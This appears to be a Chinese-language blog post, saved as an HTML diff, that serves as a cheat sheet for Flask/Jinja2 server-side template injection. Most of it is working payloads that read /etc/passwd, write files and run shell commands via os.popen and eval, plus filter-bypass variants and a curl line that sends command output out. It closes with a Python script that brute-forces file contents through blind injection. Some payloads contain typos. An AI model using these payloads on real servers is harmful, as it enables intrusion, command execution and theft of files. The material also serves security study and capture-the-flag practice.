@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>
+    Flask/Jiaja2 SSTI | 道萝岗特森&#39;s Blog
+  </title>
+  <meta name="description" content="hello world">
+  
+  <meta name="keywords" content="
+  技术总结,python,SSTI
+  ">
+  
+  <meta name="author" content="daolgts">
+
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="theme-color" content="#1e2327">
+  <link rel="apple-touch-icon" href="https://github.githubassets.com/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://github.githubassets.com/apple-touch-icon-180x180.png">
+
+  <link rel="icon" type="image/x-icon" href="/images/xixi.png">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  
+
+  
+<script>
+  var _hmt = _hmt || [];
+  (function(){var hm = document.createElement("script");
+    hm.src = "//hm.baidu.com/hm.js?a868b3c37552464bd253d45da4b33ddf";
+    var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm, s);})();
+</script>
+
+
+  <script src="//cdnjs.cloudflare.com/ajax/libs/vue/1.0.25-csp/vue.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.11.2/moment.min.js"></script>
+</head>
+
+<body id="replica-app">
+
+<nav class="navbar-wrapper">
+  <div class="navbar">
+    <div class="container clearfix">
+      <a href="/" class="navbar-logo"><i class="fa fa-github"></i></a>
+
+      <div class="navbar-search float-left desktop-only">
+        <div class="navbar-search-form">
+          <label for="gsc-i-id1">This website</label>
+          <div id="google-search">
+            <gcse:search></gcse:search>
+          </div>
+        </div>
+      </div>
+
+      <ul class="navbar-nav float-left">
+        
+        <li><a href="/archives">Archives</a></li>
+        
+        <!--  -->
+        
+        <li><a href="/tags">Tags</a></li>
+        
+        
+          <li><a href="/links">Links</a></li>
+        
+        
+          <li><a href="/about">About</a></li>
+        
+        
+      </ul>
+
+      <ul class="navbar-nav user-nav float-right desktop-only">
+        <li class="user-nav-notification">
+          <a><span class="user-nav-unread"></span><i class="fa fa-bell"></i></a>
+        </li>
+        <li>
+          <a><i class="fa fa-plus"></i> <i class="fa fa-caret-down"></i></a>
+        </li>
+        <li class="user-nav-logo">
+          <a><img src="/images/avatar.png"> <i class="fa fa-caret-down"></i></i></a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<div class="main-container">
+  <header class="header-wrapper desktop-only">
+  <div class="container header-site-detail">
+    <ul class="header-toolbar">
+      <li class="clearfix">
+        <a href="/archives" class="header-toolbar-left"><i
+                  class="fa fa-file-text"></i> Posts </a>
+        <a href="/archives"
+           class="header-toolbar-right"> 34 </a>
+      </li>
+      <li>
+        <a href="/tags" class="header-toolbar-left"><i
+                  class="fa fa-tags"></i> Tags </a>
+        <a href="/tags"
+           class="header-toolbar-right"> 15 </a>
+      </li>
+      <li>
+        <a href="/categories" class="header-toolbar-left"><i
+                  class="fa fa-folder-open"></i> Categories </a>
+        <a href="/categories"
+           class="header-toolbar-right"> 0 </a>
+      </li>
+    </ul>
+    <h2 class="header-title">
+      <i class="fa fa-book text-muted"></i>
+      <a href="/">道萝岗特森&#39;s Blog</a>
+      
+      
+    </h2>
+  </div>
+
+  <div class="container">
+    <div class="header-tab-wrapper clearfix">
+      <span class="header-tab header-tab-selected"><i class="fa fa-thumbs-o-up"></i> Like</span>
+      <span class="header-tab"><i class="fa fa-share-alt"></i> Share</span>
+      <span class="header-tab"><i class="fa fa-comments-o"></i> Discussion</span>
+      <span class="header-tab"><i class="fa fa-bookmark-o"></i> Bookmark </span>
+      <span class="header-tab"><i class="fa fa-smile-o"></i> Smile <i class="fa fa-caret-down"></i></span>
+    </div>
+  </div>
+</header>
+
+
+<div class="post-container container">
+  <h3>
+    <i class="fa fa-user-o"></i>
+    daolgts
+
+    <span class="post-date float-right" title="{{moment(1534323448000).format('MMM DD, YYYY, h:mm:ss A')}}">
+      <i class="fa fa-pencil-square-o"></i>
+      {{moment(1534323448000).fromNow()}}
+    </span>
+  </h3>
+
+  <article class="post-content">
+    <h1>Flask/Jiaja2 SSTI</h1>
+    <ul>
+<li>SSTI，又称服务端模板注入攻击。其发生在MVC框架中的view层。</li>
+</ul>
+<p>服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题</p>
+<p><img src="https://i.loli.net/2018/08/14/5b72da812b12e.png" alt></p>
+<h4 id="首先通过str、dict、tuple或list或者jinja2中的对象request获取python的基本类"><a href="#首先通过str、dict、tuple或list或者jinja2中的对象request获取python的基本类" class="headerlink" title="首先通过str、dict、tuple或list或者jinja2中的对象request获取python的基本类"></a>首先通过str、dict、tuple或list或者jinja2中的对象request获取python的基本类</h4><p>object:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[8]</span><br></pre></td></tr></table></figure>
+
+<h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><p><code>object.__subclasses__()[40]</code>为file类</p>
+<p>读文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()[40](&apos;/etc/passwd&apos;).read()</span><br></pre></td></tr></table></figure>
+
+<p>写文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()[40](&apos;/tmp&apos;).write(&apos;test&apos;)</span><br></pre></td></tr></table></figure>
+
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><ul>
+<li><code>object.__subclasses__()[59].__init__.func_globals.linecache</code>下直接有os类</li>
+</ul>
+<p>执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&apos;id&apos;).read()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].os.popen(&apos;whoami&apos;).read()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;sy&apos;+&apos;stem&apos;](&apos;ls&apos;)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>object.__subclasses__()[59].__init__.__globals__.__builtins__</code>下有<code>eval</code>，<code>__import__</code>等的全局函数</li>
+</ul>
+<p>执行命令:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&quot;__import_(&apos;os&apos;).popen(&apos;id&apos;).read()&quot;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&apos;os).popen(&apos;id&apos;).read()&quot;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os).popen(&apos;id&apos;).read()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&apos;os&apos;).popn(&apos;id&apos;).read()</span><br></pre></td></tr></table></figure>
+
+<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><ol>
+<li>过滤<code>[]</code></li>
+</ol>
+<p>读文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&apos;/etc/passwd&apos;).read()</span><br></pre></td></tr></table></figure>
+
+<p>执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&apos;ls&apos;).read()</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>过滤<code>&#39;</code></li>
+</ol>
+<p>读文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>借助request对象</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>借助request对象</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd=id</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>过滤<code>__</code></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&apos;/etc/passwd&apos;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir(0)[0][0]</span><br><span class="line">dir(0)[0][0]*2</span><br><span class="line">dir(0)[0][:2]</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>过滤<code>.</code></li>
+</ol>
+<p>用<code>getattr</code>函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; getattr((),&quot;__class__&quot;)</span><br><span class="line">&lt;type &apos;tuple&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; getattr(getattr((),&quot;__class__&quot;),&quot;__base__&quot;)</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; getattr(getattr((),&quot;__class__&quot;),&quot;__mro__&quot;)[1]</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>过滤`{{`
+</li>
+</ol>
+<p>用curl将执行结果带出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&apos;curl http://127.0.0.1:7999/?i=`whoami`&apos;).read()==&apos;p&apos; %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/test&apos;).read()[0:1]==&apos;p&apos; %&#125;~p0~&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://127.0.0.1:8080/'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(payload)</span>:</span></span><br><span class="line">    postdata = &#123;</span><br><span class="line">        <span class="string">'exploit'</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">    r = requests.post(url, data=postdata).content</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'~p0~'</span> <span class="keyword">in</span> r</span><br><span class="line"></span><br><span class="line">password  = <span class="string">''</span></span><br><span class="line">s = <span class="string">r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$\'()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\'"_%'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        payload = <span class="string">'&#123;% if "".__class__.__mro__[2].__subclasses__()[40]("/tmp/test").read()['</span>+str(i)+<span class="string">':'</span>+str(i+<span class="number">1</span>)+<span class="string">'] == "'</span>+c+<span class="string">'" %&#125;~p0~&#123;% endif %&#125;'</span></span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            password += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> password</span><br></pre></td></tr></table></figure>
+
+
+  </article>
+</div>
+
+
+    
+
+
+
+
+</div>
+
+<div class="footer-wrapper container">
+  <footer class="footer clearfix">
+    <div class="clearfix">
+    <a href="https://daolgts.github.io" class="footer-logo">
+      <i class="fa fa-github"></i>
+    </a>
+    <ul class="footer-social-link">
+      <li>© 2019 daolgts</li>
+      <li><a href="https://daolgts.github.io">Home</a></li>
+      
+      <li><a href="https://github.com/daolgts">Github</a></li>
+      
+    </ul>
+    <div class="footer-theme-info">
+      Theme <a href="//github.com/sabrinaluo/hexo-theme-replica">Replica</a>
+      by <a href="//github.com/sabrinaluo">Hiitea</a> ❤ Powered by Hexo
+    </div>
+    </div>
+    
+  </footer>
+</div>
+
+
+
+
+<script src="/js/main.js"></script>
+
+</body>
+</html>
